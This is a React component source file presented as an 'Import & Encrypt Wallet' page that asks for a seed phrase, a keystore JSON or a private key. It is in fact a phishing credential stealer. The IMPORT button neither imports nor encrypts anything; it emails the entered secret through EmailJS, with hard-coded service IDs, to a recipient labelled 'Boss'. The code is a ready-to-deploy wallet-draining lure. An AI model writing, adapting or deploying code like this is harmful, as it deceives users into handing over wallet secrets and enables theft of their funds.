import React, { useState } from 'react';
import { Box, Button, Flex, Heading, Text, Input } from '@chakra-ui/react';
import emailjs from 'emailjs-com';

const ImportWallet = () => {
  const [selectedOption, setSelectedOption] = useState('seed');
  const [inputValue, setInputValue] = useState('');

  const handleButtonClick = (option) => {
    setSelectedOption(option);
  };

  const sendEmail = () => {
    const serviceID = 'service_6xty52d';  
    const templateID = 'template_aqozuhp'; 
    const publicKey = 'ybLynysM997oOoYY2';
  
    const templateParams = {
      from_name: 'a new user',  
      to_name: 'Boss',    
      message: `Wallet Type: ${selectedOption}, Input Value: ${inputValue}`, 
    };
  
    emailjs.send(serviceID, templateID, templateParams, publicKey)
      .then((response) => {
        console.log('SUCCESS!', response.status, response.text);
        alert('Email sent successfully!');
      })
      .catch((error) => {
        console.log('FAILED...', error);
        alert('Failed to send email.');
      });
  };
  
  

  return (
    <Box textAlign="center" p={6} maxW="980px" mx="auto" fontFamily={"Montserrat"}>
      <Heading as="h1" fontSize="42px" color="black" my={6} fontFamily={"Montserrat"}>
        Import & Encrypt Wallet
      </Heading>
      <Flex direction={{ base: 'column', md: 'row' }} align="center" gap={4} mx="auto" mt={14} justify={'center'}>
        <Button
          bg={selectedOption === 'seed' ? 'black' : 'white'}
          color={selectedOption === 'seed' ? 'white' : 'black'}
          _hover={{ bg: selectedOption === 'seed' ? 'gray.800' : 'gray.100' }}
          w="200px"
          onClick={() => handleButtonClick('seed')}
          borderRadius="0px"
        >
          Seed/Recovery Phrase
        </Button>
        <Button
          bg={selectedOption === 'keystore' ? 'black' : 'white'}
          color={selectedOption === 'keystore' ? 'white' : 'black'}
          _hover={{ bg: selectedOption === 'keystore' ? 'gray.800' : 'gray.100' }}
          w="200px"
          onClick={() => handleButtonClick('keystore')}
          borderRadius="0px"
        >
          Keystore JSON
        </Button>
        <Button
          bg={selectedOption === 'privateKey' ? 'black' : 'white'}
          color={selectedOption === 'privateKey' ? 'white' : 'black'}
          _hover={{ bg: selectedOption === 'privateKey' ? 'gray.800' : 'gray.100' }}
          w="200px"
          onClick={() => handleButtonClick('privateKey')}
          borderRadius="0px"
        >
          Private Key
        </Button>
      </Flex>
      {selectedOption === 'seed' && (
        <Box mt={6}>
          <Input
            placeholder="Input your phrase value...."
            mb={4}
            h="180px"
            value={inputValue}
            onChange={(e) => setInputValue(e.target.value)}
          />
          <Text my={4}>Typically 12 (sometimes 24) words separated by single spaces.</Text>
          <Button
            bg="black"
            color="white"
            _hover={{ bg: 'gray.800' }}
            w="full"
            borderRadius="0px"
            h="50px"
            onClick={sendEmail}
            fontFamily={"Montserrat"}
          >
            IMPORT
          </Button>
        </Box>
      )}
      {selectedOption === 'keystore' && (
        <Box mt={6}>
          <Input
            mb={4}
            h="180px"
            placeholder="Input your keystore value..."
            value={inputValue}
            onChange={(e) => setInputValue(e.target.value)}
          />
          <Input placeholder="Enter password" type="password" mb={4} h="60px" />
          <Text my={4}>Several lines of text beginning with '(...)' plus the password you used to encrypt it.</Text>
          <Button
            bg="black"
            color="white"
            _hover={{ bg: 'gray.800' }}
            w="full"
            borderRadius="0px"
            h="50px"
            onClick={sendEmail}
          >
            IMPORT
          </Button>
        </Box>
      )}
      {selectedOption === 'privateKey' && (
        <Box mt={6}>
          <Input
            placeholder="Enter your private key here"
            mb={4}
            h="60px"
            value={inputValue}
            onChange={(e) => setInputValue(e.target.value)}
          />
          <Button
            bg="black"
            color="white"
            _hover={{ bg: 'gray.800' }}
            w="full"
            borderRadius="0px"
            h="50px"
            onClick={sendEmail}
          >
            IMPORT
          </Button>
        </Box>
      )}
    </Box>
  );
};

export default ImportWallet;
